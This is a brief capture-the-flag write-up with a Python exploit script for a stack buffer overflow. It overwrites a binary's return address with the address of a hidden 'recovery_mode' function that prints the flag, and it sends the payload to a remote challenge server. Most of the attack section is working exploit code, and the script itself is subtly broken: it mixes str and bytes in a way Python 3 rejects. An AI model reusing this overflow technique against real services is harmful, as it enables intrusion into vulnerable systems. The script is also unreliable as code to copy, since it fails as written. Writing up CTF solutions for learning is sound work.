#This challenge was a pwn challenge.
#We had a binary and an address to do the exploit, I disassembled the binary in ghidra and I found a suspicious function :

void recovery_mode(void)

{
  system("cat  ./flag");
  return;
}
#Okay so the goal will be to call it. If we sent 40 a to the binary, we receive a segmentation fault. 
#We use nm to find the adress of recovery mode
# nm kanagawa | grep reco
#result : 0804851b recovery_mode
#transforming it with little endian gives us  \x1b\x85\x04\x08
#so we send to the binary 40 a + the address writen in little endian, and it gives us the flag

import socket
import time
import pwn
import struct
TCP_IP='challs.dvc.tf'
TCP_PORT=4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print('connected')

data = s.recv(1024)
print(data.decode())
msg = 'a'*40
s.send(msg+'\x1b\x85\x04\x08'+'\n'.encode())
print(msg,len(msg))
data = s.recv(4096)
print(data)
s.send('b\n')
data = s.recv(4096)
print(data.decode())

                                          
